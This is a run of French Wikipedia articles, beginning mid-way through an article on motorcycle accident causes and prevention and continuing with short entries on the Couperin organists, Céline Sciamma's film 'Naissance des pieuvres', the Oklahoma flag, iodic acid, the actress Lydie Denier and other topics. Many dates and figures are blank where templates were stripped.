Certaines autorité de sécurité routière considèrent que lorsque le motard est seul sur la route, une perte de contrôle dans un virage se produit souvent à cause d’une vitesse excessive.
Dans l'UE (Allemagne, Italie, Pays-Bas, Finlande, Suède et Royaume-Uni), une enquête menée entre 2005 et 2008 révèle que la première cause d'accident (événement critique) pour les 2RM est une action prématurée des autres conducteurs dans une proportion de 37 %, par exemple un conducteur d'automobile qui s'engage trop tôt dans une intersection et coupe la route du motard. L'excès de vitesse du motard, que ce soit par rapport à la VMA, aux conditions de circulation ou aux attentes des autres usagers n'intervient qu'à hauteur de 23%.
En Australie, 39 % de la mortalité des motards est due à la vitesse.
Infrastructures routières.
Les infrastructures routières sont souvent dotées de caractéristiques qui ne pardonnent pas.
Conçues avant tout pour les voitures, les infrastructures routières tiennent rarement compte des caractéristiques physiques des deux-roues motorisés, pour lesquels elles peuvent être dangereuses. La dispersion des responsabilités entre les gestionnaires du réseau routier (État, collectivités territoriales) et la faiblesse des normes en matière de mobilier urbain constituent les principales causes de ces dysfonctionnements. Ce problème a été mis en évidence par diverses études, par exemple le rapport Guyot qui estime que auraient pu être épargnées en France en 2005 par la suppression des obstacles fixes dangereux, de deux-roues motorisés ayant été tués cette année-là. Ce rapport met également en évidence le peu d'intérêt des pouvoirs publics pour la mortalité des deux-roues à cette époque.
Les infrastructures dangereuses se classent en deux catégories :
Visibilité des deux-roues motorisés.
Selon l'étude MAIDS, lorsqu'un accident est imputable au conducteur d'un autre véhicule, dans plus de 70 % des cas, ce conducteur n'a pas détecté la présence du deux-roues motorisé. Les conducteurs d'automobile disposant du permis moto en auraient une meilleure perception.
Visibilité aux États-Unis.
Aux États-Unis, la première étude importante, le , menée dans la région de Los Angeles où plus de sont étudiés, est publiée en . Les trois quarts de ces accidents impliquent un automobiliste (le dernier quart étant un accident sans autre usager impliqué, dont les deux tiers sont imputables à une erreur de conduite du motocycliste). Dans le cas des accidents impliquant un automobiliste, deux fois sur trois la cause de l'accident est un refus de priorité de la part de celui-ci, lequel n'a pas vu, ou alors trop tard, le deux-roues motorisé. II s'agit là aussi d'une étude ayant lieu en milieu urbain, la vitesse médiane lors des accidents étant estimée à ().
Fin , la Federal Highway Administration (Administration fédérale des autoroutes), conjointement avec l'université d'État de l'Oklahoma, lance un grand programme d'étude sur le sujet. En effet, de 1997 à 2009, le nombre de décès de conducteurs d'un deux-roues motorisé a doublé aux États-Unis, alors qu'il a baissé de 27 % pour les autres véhicules. Les résultats de cette étude doivent être rendus publics en 2018.
Visibilité en Océanie.
Une étude est publiée en 2004, portant sur des accidents survenus dans la zone urbaine d'Auckland en Nouvelle-Zélande entre 1993 et 1996. S'intéressant à la question de la visibilité des motos, elle interroge accidentés et autres motards formant une population témoin. Il en ressort que le port d'un gilet fluorescent peut réduire le risque de 37 %, le port d'un casque de couleur blanche de 24 % et l'allumage des phares de 27 %.
Visibilité en Europe.
Les collisions entre une moto et une voiture de tourisme surviennent généralement lorsque le deux-roues n'a pas été bien perçu. Le conducteur de l'autre véhicule peut sous-estimer la distance et la vitesse de la moto. Les motards dépassent dans des situations où les autres véhicules ne pourraient pas le faire, de ce fait, les autres usagers de la route ne s'attendent pas à chercher du regard une moto à des endroits où l'on ne s'attend pas à voir un véhicule surgir. De plus, . Les motards peuvent également contribuer à ce risque par leur absence de compréhension de cette situation, d'après la Commission européenne.
Une étude française publiée en 2016 suggère qu'une partie de ce problème de visibilité des deux-roues motorisés s'expliquerait par la pratique des remontées de files.
Comportement spécifique de leurs conducteurs.
Parmi les facteurs de risque décelés par l'étude MAIDS, on note un grand nombre d'erreurs dans les décisions prises par les conducteurs de 2RM confrontés à un accident imminent : par exemple, ils optent pour une mauvaise stratégie au moment d'éviter une collision imminente, ce qui peut mettre en cause leur formation initiale.
L'Observatoire national interministériel de la sécurité routière de France (ONISR), pointe plus généralement l'absence d'anticipation des motocyclistes, leur trop grande confiance dans leurs capacités et leur tendance à sous-estimer leur vulnérabilité.
Une autre étude, datée de 2008, met en avant des facteurs cognitifs liés à l'interaction avec les automobilistes. Ceux-ci sont peu habitués aux rencontres avec des deux-roues motorisés et ne s'attendent pas à les voir surgir dans leur environnement proche. Cette étude confirme des erreurs d'interprétation des motocyclistes dans une telle situation : ils acceptent et justifient pour eux-mêmes "des comportements « atypiques ou spécifiques » et en dehors de ce que l’on peut attendre selon les règles du code de la route", sans avoir conscience que d'autres usagers peuvent ne pas s'attendre à de tels comportements.
Ils auraient plus généralement tendance à prendre davantage de risques que les autres conducteurs, ce qui se traduit par exemple par un moindre respect des limites de vitesse.
Causes communes à d'autres catégories de véhicules.
Dans le cadre de l'étude MAIDS, l'excès de vitesse ne contribue à l'accident que dans quelques cas isolés , la vitesse de déplacement au moment de l'impact est ce qui s'explique par la surreprésentation des accidents en milieu urbain dans cette étude (72 % des cas). En effet, la différence de vitesse entre les 2RM et les autres véhicules est fréquemment mise en avant comme cause d'accident. Cette cause est beaucoup plus souvent recensée chez les auteurs présumés d’accidents mortels motards que chez les conducteurs de véhicules de tourisme. Une vitesse inadaptée ou excessive expliquerait, en France, le fort pourcentage de motards tués dans un accident n'impliquant aucun autre véhicule.
L'alcool intervient dans une proportion proche de celle constatée pour les conducteurs d'autres véhicules.
Prise en compte législative.
Le code de la route français dispose que les motos doivent rouler feux de croisement allumés de jour comme de nuit, afin de les distinguer du trafic automobile.
Dans la plupart des pays, seul le casque équipé d'autocollants réfléchissants revêt un caractère obligatoire mais la plupart des motards, conscients des risques encourus en cas de chute, font l'acquisition de vêtements adéquats (Voir Vêtement pour motard).
En France, depuis , la puissance des motos était limitée à (). Une tolérance de 6 % était cependant appliquée, portant la puissance maximale à ().
Depuis le , la puissance n'est plus limitée. Tous les véhicules produits avant cette date équipés de l'ABS peuvent être débridés et conduits, sans limitation de puissance à condition de posséder le permis A.
Prévention des risques.
Risques courants.
Une fatigue générale, générée par un manque de sommeil et un quotidien stressant, est dangereuse pour tous les usagers de la route. Or, l'équilibre physique et mental du motard assure la tenue de son équilibre sur la moto. Cette fatigue, plus que la régularité du temps de parcours, devrait inciter à ralentir, ce qui n'est pas toujours le cas. La conduite d'un deux-roues peut être remplie d'automatismes et de prises de risque rendues moins anormales par l'habitude. Une remise en cause régulière du pilotage ainsi que l'inscription à des stages de pilotage favorisent la sécurité. Si les sensations que procure l'essorage de la poignée donne des envies de recommencer, mieux vaut opter pour l'utilisation d'un circuit sécurisé. Bien que la moto permette l'expression d'une volonté de différenciation des autres usagers, il faut absolument éviter l'agressivité par le bruit excessif ou les excès de vitesse. Malgré une tenue vestimentaire qui peut être pénible à supporter les jours d'été, beaucoup de motards préfèrent transpirer plutôt que risquer des séquelles à vie liées au manque de protection comme les brulures profondes de second et troisième degré nécessitant des greffes de peau.
D'une façon générale, ces points sont importants :
Réduire les risques.
Le permis pour les motocyclistes ne fournissant qu'un apprentissage minimal, certains pays voient la création d'organismes capables de fournir une formation de perfectionnement à la conduite.
Aux États-Unis, la (MSF) propose dans les États de l'Oregon et d'Idaho des formations supplémentaires.
Au Royaume-Uni, des organisations telles que l' (IAM) et la (RoSPA) propose des formations avancées avec l'objectif de réduire les causes d'accidents.
Au Canada, l'organisation (CSC) fournit des entraînements adaptés. La qualité de ces programmes est reconnue nationalement par le Motorcycle and Moped Industry Council (MMIC).
En France, l'AFDM est une structure de prévention et de formation à la conduite deux-roues issue de la FFMC.

</doc>
<doc id="1874010" url="https://fr.wikipedia.org/wiki?curid=1874010" title="Gervais-François Couperin">
Gervais-François Couperin

Gervais-François Couperin, né à Paris le — décédé dans la même ville le , est le dernier représentant masculin de la célèbre dynastie de compositeurs et organistes Couperin.
Biographie.
Il étudie avec son père Armand-Louis Couperin. En 1789, Gervais-François qui signait « Couperin le jeune », remplace son père à l'orgue de la Sainte-Chapelle. Quelques mois plus tard, il succède à son frère Pierre-Louis Couperin à l'orgue de Notre-Dame de Paris, position qu'il conserve jusqu'à la Révolution. Il est ensuite organiste à Saint-Gervais et à Saint-Merri (1818 – 1826).
Il a épousé Hélène Thérèse Frey (1775-1862), cantatrice dont il a eu une fille, Céleste-Thérèse (1793-1860), elle aussi organiste.

</doc>
<doc id="1874028" url="https://fr.wikipedia.org/wiki?curid=1874028" title="Naissance des pieuvres">
Naissance des pieuvres

Naissance des pieuvres est un film dramatique français écrit et réalisé par Céline Sciamma, sorti en 2007.
Il s'agit du premier long-métrage de la réalisatrice, basé sur son scénario de fin d'étude à la Fémis.
Synopsis.
Pendant l'été de leurs quinze ans, trois adolescentes vivent difficilement l'éclosion de leur sexualité. Marie traîne souvent avec Anne qui est complexée sur son physique et espère être aimée de François, membre de l'équipe de water-polo. Au club de natation synchronisée, pendant qu'Anne entraîne les poussines, Marie observe avec une curiosité troublée Floriane, la capitaine de l'équipe minime.
En échange de l'entrée dans la piscine pendant les entraînements, Marie tient la chandelle à Floriane pour que celle-ci puisse voir François le soir. Cependant, malgré une réputation de fille facile, Floriane appréhende sa première fois et finit par s'en confier à Marie.
Production.
Genèse et développement.
"Naissance des pieuvres" est le premier film de Céline Sciamma. Il est basé sur le scénario d'examen de fin d'études de la Fémis passé par Sciamma, et que Xavier Beauvois, alors membre du jury, a encouragé à développer pour un long métrage.
Selon la réalisatrice, le titre bizarre du film s'explique ainsi : La « naissance des pieuvres », c'est donc la naissance de l'amour à l'âge de l'adolescence.
Bande originale.
La bande originale du film, signée par Para One, est composée de musiques écrites pour le film :
Le thème principal, illustrant également la bande-annonce du film, est cependant une reprise du titre "Trahison" de l'album "OK Cowboy" (2005) de Vitalic, non présente dans la BOF. Le morceau dans la discothèque est "The First Rebirth", de Jones &amp; Stephenson.
Thèmes.
La condition féminine et l’hétéropatriarcat.
Le film de C. Sciamma dépeint le système hétéropatriarcal ainsi qu'une vision de la condition féminine. Pour commencer, la piscine qui est au centre de l’œuvre symbolise l’hétéropatriarcat en disciplinant le corps des nageuses et en faisant correspondre leurs attitudes et leur physique avec une féminité normative. Cela passe notamment par la disciplinarisation de leur corps auquel sont imposés des “mouvements calculés et répétitifs”mais aussi par l’inspection minutieuse de la coach lorsqu’elle juge si les aisselles des danseuses sont bien épilées ou non. Z. Green avance même dans son travail que leurs performances sont construites pour le male gaze. (Cela est tout de même paradoxal car c’est cet environnement qui attire le regard de Marie et qui lui permet d’exprimer son désir lesbien en se confrontant à la réalité hétéronormative des normes de genre.) Si l’on se penche davantage sur la représentation des nageuses qui est faite pendant le film, celles-ci sont comparables à des poupées ou même à des soldats qui doivent cacher les efforts qu’elles font en dessous de l’eau et prétendre que ce qu’elles montrent comme performance parfaite à l’extérieur représente aussi leur intérieur. Cela peut faire penser aux efforts constants que les femmes doivent employer afin de correspondre aux normes de féminité dominantes et de s’intégrer au système hétéropatriarcal. Par ailleurs, on remarque que le lieu de la piscine est scindé en deux entre les garçons qui jouent au waterpolo et les filles qui font de la natation synchronisée (summum de la performance de la féminité) renforçant la binarité de genre et impliquant un choix pressant entre ces deux disciplines. Cela nécessite de performer soit la masculinité, soit la féminité. Finalement, l’hétéropatriarcat règne dans la vie des filles tout le long du film et cela est particulièrement visible lorsque Floriane se confie sur des expériences qui lui sont arrivées et qui pourraient être qualifiées d’agressions. Pour conclure, l’article de Louane Morin avance que ces dynamiques de genre et l’imposition des normes de féminité sont concentrées dans le personnage de Floriane qui présente un rôle sur lequel sont concentrées des présuppositions sexistes. En effet, celle-ci est dépeinte comme une fille facile par ses coéquipières et plutôt que de combattre ces insultes, elle ne les rejette pas et assume sa perception d’elle-même ainsi. D’ailleurs, elle se vante même de ses relations avec les garçons de waterpolo mais aussi avec des hommes plus âgés. Finalement Louane Morin avance que Floriane est terrifiée de ne pas vivre à la hauteur de sa réputation, celle de ne pas répondre aux besoins sexuels de ses partenaires, même si ce n’est pas ce qu’elle désire forcément. Par conséquent le film par sa représentation du milieu de la piscine, des nageuses et des stéréotypes projetés contre Floriane dépeint des normes de féminité imposées aux nageuses ainsi que la présence de l'hétéropatriarcat dans l'environnement dans lequel elles évoluent.
L'hétérosexualité compulsive et l'ambiguïté du désir de Floriane.
Floriane, la cheffe de l’équipe de natation synchronisée va pendant le film avoir une attitude paradoxale envers son hétérosexualité présumée. D’abord, elle est présentée comme un idéal de la féminité hétéronormative qui est l’objet du désir des hommes. Cela est visible dans une des premières scènes qui la montre comme bourgeonnante au centre de la fleur que ses coéquipières réalisent avec leur corps lors d’un numéro de natation synchronisée. Cette métaphore de la fleur bourgeonnante la symbolise comme objet d’un désir sexuel. Désirs qui attirent la hantise de ses coéquipières mais aussi l’œil de Marie. À partir de ce moment, les personnages de Floriane et Marie commencent à se fréquenter, Marie car elle est attirée par Floriane, et Floriane car elle se sert de Marie pour voir son petit-copain. Naît alors une relation ambiguë entre les deux jeunes filles qui rappelle le concept d’hétérosexualité compulsive développé par A. Rich. Plusieurs scènes illustrent cette idée. Premièrement, la nature de la relation entre les deux filles à ses débuts : Floriane utilise Marie pour qu’elle l’emmène voir son petit-copain or on remarque que c’est vite l’occasion pour elle de se rapprocher de Marie en touchant son maillot de bain, en la regardant de manière insistante, en lui caressant les cheveux ou encore en lui donnant une de ses médailles. Ainsi, une relation ambiguë se crée entre les deux filles sans que Floriane abandonne son intérêt pour son petit-copain et elle exprime toujours le besoin qu’il "prenne" sa virginité. Cela rentre complètement dans le concept d’hétérosexualité compulsive : Floriane est clairement attirée par Marie mais elle se sent obligée de répondre aux besoins sexuels de son petit-copain. Le travail de la caméra sur ce sujet est aussi intéressant comme le remarque M.C. Jonet : dans une scène où Floriane mange sa banane (répondant aux injonctions du mâle gaze), la caméra suit le regard de cette dernière pour aller vers ses coéquipières puis vers Marie, dépeignant un moment homo-érotique. Après cette prise de vue, Floriane vient s’asseoir près de Marie, lui demande une faveur et écrit de manière sensuelle son adresse sur la main de Marie pour qu’elle la rejoigne plus tard. Cette tension entre hétérosexualité compulsive et désir lesbien est, par ailleurs, symbolisée par une scène de danse dans laquelle Floriane s’approche sensiblement de Marie, fait mine de l’embrasser (la musique devenant intense), pour finalement qu’elle quitte le cadre pour rejoindre un homme (la musique redevenant douce). Cette scène pour Z. Green représente l’affection queer qui est suivie directement d’un rejet de la part de Floriane pour rejoindre une relation hétérosexuelle. Cela caractérisera leur relation tout le long du film. Finalement, l’hétérosexualité compulsive et l’ambiguïté du désir queer de Floriane pour Marie est à son comble lorsque Floriane demande à Marie de prendre sa virginité en lui confiant au départ qu’elle a envie que ce soit elle spécifiquement, pour finalement lui dire “Comme ça tu t’en débarrasses”. Cela a en fait pour fonction qu’elle puisse coucher avec son petit copain. Pour résumer, même s’il y a un réel désir entre les deux jeunes filles, Floriane est conditionnée par l’hétéronormativité qui est un obstacle à son désir lesbien pour Marie. 
L'oralité : le symbole du désir queer de Marie.
L’oralité a été analysée par M.C. Jonet et M.C.L.G. Green comme symbole du désir queer entre Floriane et Marie. Cela est visible dans plusieurs scènes notamment lorsque Floriane laisse la trace d’un baiser contre la baie-vitrée de Marie et que celle-ci presse ses lèvres vers la trace de rouge à lèvre laissée par Floriane. Cela permet à Marie d’exprimer son désir mais aussi de montrer le potentiel amoureux inachevé entre elles. Le thème de l’oralité est aussi présent dans le film sous la forme de l’ingestion. Au milieu du film, Marie vole la poubelle de Floriane et retrouve les débris d’une pomme et y croque dedans. Cela pourrait montrer l’intérêt obsédant qu’a Marie pour Floriane mais aussi la présence d’une énergie sexuelle renforcée par le fait que Marie mette sa main devant sa bouche après avoir avalé le morceau de pomme. Cela montre la connexion de l’acte avec sa bouche et surtout le fait que Marie veuille "toucher ce que la bouche de Floriane a touché". Par ailleurs, selon M.C.L.G. Green l’eau joue un rôle important pour l’oralité comme symbole du désir lesbien. Celle-ci est présente dans les douches, dans la piscine et dans les crachats, des éléments qui lient Marie et Floriane. Pour exemplifier cela, nous pouvons prendre l’exemple de la prise de vue de Marie dans la douche qui a les yeux fermés après avoir regardé les filles s’exercer à la natation synchronisée. Celle-ci sort sa langue pour goûter à l’eau et la recrache. Selon Z. Green, en goûtant l’eau cela connecte Marie et Floriane, leurs corps ayant tous les deux touché à la même eau. D’ailleurs, plus tard, les deux filles prennent une douche ensemble. Finalement selon S. Belot l’eau qui est associée à l’oralité dans le film montre l’ampleur et l’intensité du désir de Marie pour Floriane.

</doc>
<doc id="1874031" url="https://fr.wikipedia.org/wiki?curid=1874031" title="Pierre-Louis Couperin">
Pierre-Louis Couperin

Pierre-Louis Couperin ( — ) est un organiste, claveciniste et compositeur français, membre de la célèbre dynastie de compositeurs-organistes Couperin. 
Biographie.
Pierre-Louis Couperin, qui signait «Couperin l'aîné», étudia avec son père Armand-Louis Couperin, et sa mère, fille du célèbre facteur de clavecins François Étienne Blanchet. Il fut, le , présenté par son père pour obtenir sa survivance à sa place d'organiste à St-Gervais. Mais il ne profita que peu de temps de cette charge, étant décédé quelques mois après son père. Son jeune frère Gervais-François lui succéda. Il fut inhumé le en l'église Saint-Gervais, dans le caveau où se trouvait déjà son père. La chapelle de la Providence où se trouvait ce caveau a été pillée par les révolutionnaires quelques années après.

</doc>
<doc id="1874032" url="https://fr.wikipedia.org/wiki?curid=1874032" title="Avenue du Diamant">
Avenue du Diamant

L'avenue du Diamant (en néerlandais : "Diamantlaan") est une avenue bruxelloise de la commune de Schaerbeek qui va de la chaussée de Louvain au boulevard Auguste Reyers en passant par le square Eugène Plasky.
L'avenue du Diamant passe également par l'avenue de la Topaze, la rue du Radium, l'avenue Léon Mahillon, l'avenue Milcamps, l'avenue de l'Opale et l'avenue Adolphe Lacomblé.
D'autres rues du quartier portent le nom de pierres précieuses ou de pierres fines :

</doc>
<doc id="1874033" url="https://fr.wikipedia.org/wiki?curid=1874033" title="Drapeau de l'Oklahoma">
Drapeau de l'Oklahoma

Le drapeau de l'Oklahoma est le drapeau officiel de l'État américain de l'Oklahoma, et représente sur un fond bleu un bouclier en peau de bison typique de la tribu amérindienne des Osages décoré de sept plumes d'aigle. Un calumet de la paix et un rameau d'olivier, symboles de paix respectifs des peuples indigènes d'Amérique et de la culture occidentale, sont placés en croix à l'avant du bouclier.
Serment d'allégeance.
La législature d'État adopta le serment d'allégeance en 1982 :
Histoire.
Le premier drapeau d'État de l'Oklahoma a été adopté en 1911, quatre ans après l'entrée dans l'Union de l'Oklahoma. Les trois couleurs rouge, blanc, bleu , au centre figure une large étoile blanche avec un contour bleu sur fond rouge. Le nombre 46 à l'intérieur de l'étoile est écrit en bleu, signifiant que l'Oklahoma est le État à rejoindre l'Union.
Un concours fut organisé en 1924 par les Filles de la révolution américaine pour remplacer le premier drapeau, les drapeaux rouges étant alors trop étroitement associés au communisme. L'œuvre de Louise Fluke remporta le concours et elle fut adoptée le ; elle était identique à l'actuel drapeau à l'exception du mot "Oklahoma". Le nom de l'État fut ajouté au drapeau en 1941 comme outil pour combattre l'analphabétisme encore répandu. Les couleurs et formes furent standardisées par le projet de loi signé par le gouverneur Brad Henry le .
Drapeau du gouverneur.
Selon le statut adopté en 1957, le drapeau du gouverneur se compose d'un fond vert forêt bordé tout autour d'une frange dorée, avec le sceau de l'Oklahoma entouré par 5 étoiles blanches.

</doc>
<doc id="1874034" url="https://fr.wikipedia.org/wiki?curid=1874034" title="Éternel second">
Éternel second



</doc>
<doc id="1874035" url="https://fr.wikipedia.org/wiki?curid=1874035" title="L'éternel second">
L'éternel second



</doc>
<doc id="1874036" url="https://fr.wikipedia.org/wiki?curid=1874036" title="File">
File



</doc>
<doc id="1874040" url="https://fr.wikipedia.org/wiki?curid=1874040" title="Jean-François Garneray">
Jean-François Garneray

Jean-François Garneray, dit aussi François-Jean Garnerey, né à Paris le et mort à Auteuil le , est un peintre français.
Biographie.
Fils d’un naturaliste, il entre, grâce à la protection de son père, dans l’atelier de David, dont il devient l’un des premiers élèves en 1782. Il y passe plusieurs années et se lie au maître qu’il assiste dans la réalisation de quelques-unes de ses œuvres. Il bénéficie donc du titre prestigieux et envié d’« élève de David ». Il expose à presque tous les Salons de 1791 à 1835. Jusqu’à la Révolution, il se présente d’abord comme « peintre en miniature » et son travail portera longtemps la marque de cette première spécialité. Louis-Gabriel Michaud, qui l’égratigne, souligne «" son dessin correct et une fidélité peut-être trop minutieuse dans la reproduction des détails […] il réussissait mieux encore dans les études de fleurs, la reproduction des objets inanimés, tels que les monuments et les costumes. Il avait sous ce rapport un talent très réel, qui lui valut, pendant quelque temps, l’emploi de dessinateur à l’Académie royale de musique" » .
Pierre Larousse lui consacre au contraire une notice élogieuse et rappelle ses œuvres qui ont fait date, comme le portrait de Charlotte Corday dessiné pendant son interrogatoire. D’abord très marqué par l’influence de son maître, au point que la critique moderne lui a restitué parfois quelques œuvres traditionnellement attribués à David. Garneray s’en émancipera en douceur pour aller vers une peinture moins épique, mais aussi moins austère. Ainsi, sous la Révolution, s’illustre-il par une série de portraits des acteurs politiques qui sont abondamment diffusés par les estampes en couleur du graveur Pierre-Michel Alix (1762-1817). Mais, au début de la Restauration, il sera l’un des pionniers du goût troubadour et suscite la réprobation de son vieux maître. À côté de cette longue carrière de portraitiste et de peintre d’histoire, il a aussi beaucoup pratiqué la scène familière et intimiste, ne manquant pas d’y placer souvent ce qui paraît être ses deux passions, les chats et la musique. Il eut aussi quelques élèves. Son travail a finalement été un peu éclipsé par la réussite de deux de ses fils : Auguste (1785-1824) et Louis (1783-1857), le grand peintre de marines français qui rappelle au début de ses célèbres et pittoresques souvenirs : « "Mon père [était un] peintre de genre, dont le nom figure honorablement dans les biographies des contemporains" ». Par ailleurs, Jean-François Garneray a été un franc-maçon très actif membre de la loge "L'Amitié" du Grand Orient de France.
Ses trois fils :
Œuvres.
Huile sur toile, 113 par 147,6, signé daté et légendé "âgé de 72 ans" ; Exposé au Salon de 1827 avec la légende suivante : "Il profite de l'émotion que cause au jeune Prince l'aspect inaccoutumée de la misère qui règne dans cette retraite du pauvre, pour disposer son âme à y compâtir et à la soulager un jour".
Vendu par la maison de ventes aux enchères Hampel à Munich le , .

</doc>
<doc id="1874043" url="https://fr.wikipedia.org/wiki?curid=1874043" title="Pseudambassis">
Pseudambassis



</doc>
<doc id="1874046" url="https://fr.wikipedia.org/wiki?curid=1874046" title="Pseudambassis ranga">
Pseudambassis ranga



</doc>
<doc id="1874049" url="https://fr.wikipedia.org/wiki?curid=1874049" title="24 Heures du Mans 1982">
24 Heures du Mans 1982

Les 24 Heures du Mans 1982 sont la de l'épreuve et se déroulent les 19 et 20 juin 1982 sur le circuit de la Sarthe. Cette course est la quatrième manche du Championnat du monde des voitures de sport 1982 (WSC - World Sportscar Championship).
Nombre de pilotes qualifiés pour la course.
Cette année, les 24 Heures du Mans fêtent leur cinquantième édition avec au volant, 154 pilotes dont deux femmes.
Déroulement de la course.
Classement final de la course.
Voici le classement officiel au terme des 24 heures de course.
"Détail :"
Heures en tête.
Voitures figurant en tête de l'épreuve à la fin de chaque heure de course :

</doc>
<doc id="1874051" url="https://fr.wikipedia.org/wiki?curid=1874051" title="Chasseurs">
Chasseurs



</doc>
<doc id="1874053" url="https://fr.wikipedia.org/wiki?curid=1874053" title="Enquêtes à l'italienne">
Enquêtes à l'italienne

Enquêtes à l'italienne ("") est une série télévisée italienne en 13 épisodes de 55 minutes, diffusée à partir de sur la Rai. Le tournage se déroula à Rome dans les studios Cinecittà.
En France, la série a été diffusée sur TF1 puis multi-rediffusée dans les programmes de la nuit de la chaîne de 1990 à 2003.
Synopsis.
L'histoire se déroule vers 1900 à Turin, dans le royaume d'Italie, sous le règne du roi Umberto. L'éminent professeur Boato a une renommée internationale dans la science qui consiste à identifier un coupable à partir de sa morphologie. Le commissaire Ferrante fait donc appel au professeur pour l'aider à résoudre les nombreux crimes étranges et farfelus commis dans sa ville. Le professeur expédie au plus vite ces affaires, pour passer plus de temps dans son cabaret favori, en charmante compagnie. Tout irait bien ainsi pour le professeur s'il n'avait un apprenti, Scipion, fan de l'Angleterre et adepte de Sherlock Holmes. Pour celui-ci, seuls le raisonnement scientifique et les preuves mathématiques peuvent résoudre les énigmes. Constamment en désaccord avec le professeur, il s'acharne à poursuivre l'enquête baclée par son maître, et arrive à démasquer tous les coupables. Mais c'est le professeur qui vole la vedette à Scipion, en récoltant à chaque fois les honneurs...
Épisodes.
 ► 01 - L'Énigme de la locomotive volante ("Il mistero dell'inseguitore di landò") avec :
 ► 02 - L'Énigme du rire qui tue ("Il mistero della risata che uccide") avec :
 ► 03 - Le Secret de la tarte du chef ("L'enigma del digiunatore di Pinerolo") avec :
 ► 04 - Le Mystère de la femme à barbe ("L'omicidio del banchiere galante") avec :
 ► 05 - Le Cas étrange de la rose écarlate ("Il misfatto dell'adultero scapigliato") avec :
 ► 06 - Le Crime diabolique de la vipère humaine ("Il diabolico crimine della vipera umana") avec :
 ► 07 - L'Énigme du canard au sang ("L'enigma dell'anatra di Viggiù") avec :
 ► 08 - Le Sculpteur mort de froid ("Il mistero dello scultore assiderato") avec :
 ► 09 - Le Secret du premier tambour ("La vendetta del tamburino sardo") avec :
 ► 10 - La Mort mystérieuse du joueur de boules ("Lo strano caso del bocciofilo suicida") avec :
 ► 11 - Le Cas de l'étrangleur de girafe ("L'insolito caso dello strigliatore di giraffe") avec :
 ► 12 - L'Énigme du fleuve ("L'inafferrabile mostro del fiume Po") avec :
 ► 13 - L'Enquête la plus dangereuse ("L'ultima pericolosa indagine") avec :

</doc>
<doc id="1874054" url="https://fr.wikipedia.org/wiki?curid=1874054" title="Acide iodique">
Acide iodique

L'acide iodique est un composé chimique de formule brute . C'est un oxoacide d'iode dont la base conjuguée est l'anion iodate . Il contient un atome d'iode à l'état d'oxydation +5 et est l'un des oxoacides d'halogène les plus stables.
Propriétés chimiques.
L'acide iodique est un oxydant fort très soluble dans l'eau mais, contrairement à ses homologues et , il peut également être isolé à l'état pur.
Il se déshydrate en pentoxyde d'iode par chauffage contrôlé, puis se décompose par chauffage plus poussé en un mélange d'iode , d'oxygène et d'oxydes d'iode inférieurs.
On peut le préparer en oxydant de l'iode avec des oxydants forts tels que l'acide nitrique , le chlore , l'acide chlorique ou le peroxyde d'hydrogène , par exemple :
Dans cette réaction, l'acide chlorhydrique doit être éliminé au fur et à mesure afin de ne pas renverser l'équilibre en réduisant l'acide iodique nouvellement formé, ce qu'on peut réaliser par exemple avec de l'oxyde de mercure HgO.

</doc>
<doc id="1874056" url="https://fr.wikipedia.org/wiki?curid=1874056" title="Lydie Denier">
Lydie Denier

Lydie Denier, née le à Pontchâteau, près de Saint-Nazaire, est une actrice française. Sa carrière se déroule principalement aux États-Unis. Elle est surtout connue pour le rôle de Jane dans la série "Tarzan" et celui de Nicole Bernard dans la série "Agence Acapulco".
Biographie.
Très jeune, elle quitte sa région et monte à Paris tout en prenant des cours pour devenir hôtesse de l'air. Finalement elle devient mannequin chez Yves Gérard, un styliste martiniquais, puis elle part à Los Angeles, où elle tourne des pubs et des vidéos musicales. Elle est découverte pour la première fois aux États-Unis dans le film "À l'épreuve des balles" (1987), aux côtés de Gary Busey.
Son premier engagement régulier à la télévision est dans le feuilleton "General Hospital", où elle est choisie en 1989 pour le rôle de Yasmine Bernoudi.
En 1991, elle donne la réplique à Wolf Larson dans la série "Tarzan", où elle incarne le personnage mythique de Jane. Diffusée dans 87 pays, la série dure trois saisons et 75 épisodes, ce qui fait de Lydie Denier la principale interprète de Jane dans l'histoire du cinéma comme de la télévision.
Après avoir tenu des rôles importants dans de nombreux films et téléfilms américains, elle devient l’une des héroïnes de la série "Agence Acapulco" en 1996-1997, dans le rôle de Nicole Bernard, une ancienne espionne française qui reforme l'agence dans la deuxième saison.
Elle est invitée dans de nombreuses autres séries américaines populaires, comme "Starman", "Alerte à Malibu", "Flash", "Melrose Place", "China Beach", "China Beach", "Les dessous de Palm Beach", "Les Aventures fantastiques de Tarzan", "Pacific Blue", "Spin City", "Gilmore Girls", etc. Elle participe aussi à des co-productions internationales comme "Conan" et "Les Nouvelles Aventures de Robin des Bois".
Au théâtre, Lydie Denier incarne avec succès l’iconique Greta Garbo dans "Garbo's Cuban Lover". On trouve la critique suivante dans "Hollywood Press Corps" en 2023 : « Lydie Denier en Greta Garbo livre une très belle performance. Comment parvenir à saisir à la fois la voix grave et les réponses monosyllabiques de Greta Garbo ? Lydie capte parfaitement l’humour de Greta ainsi que son rythme de parole. Elle est également superbe dans les costumes scandinaves qu’elle porte. Elle a l’aura de Garbo et l’énergie d’une comédienne de théâtre professionnelle.»
Lydie Denier est également productrice, scénariste et réalisatrice, notamment du documentaire "Unforgotten Box" (2024). Elle a aussi présenté l'émission politique et sociale "Time To Get Real with Lydie Denier" et l'émission culinaire "Breaking Bread with Lydie Denier".
Vie privée.
Dans l'émission "Double Jeu" diffusée le , l'imitateur français Yves Lecoq prétendra à Thierry Ardisson avoir eu une relation avec Lydie Denier avant qu'elle ne parte pour les États-Unis.
Lydie Denier a été fiancée à J. Christopher Stevens, l'ambassadeur des Etats-Unis en Libye, tué le 11 septembre 2012 dans l'attaque du consulat américain à Benghazi. Elle est l'auteur du livre "A Voice for Ambassador J. Christopher Stevens", paru en 2016.

</doc>
<doc id="1874057" url="https://fr.wikipedia.org/wiki?curid=1874057" title="Jean-Jacques Beauvarlet-Charpentier">
Jean-Jacques Beauvarlet-Charpentier

Jean-Jacques Beauvarlet-Charpentier, né à Abbeville en Picardie le et mort à Paris le , est un claveciniste, organiste et compositeur français. Il compte parmi les organistes les plus célèbres de son temps.
Biographie.
Son père est marchand teinturier, organiste et facteur d’orgues. Vers 1748, la famille s’installe à Lyon. Le père abandonne son métier de marchand et tient l'orgue de l’Hospice de la Charité. En , Jean-Jacques joue un de ses concertos au Concert Spirituel de Paris.
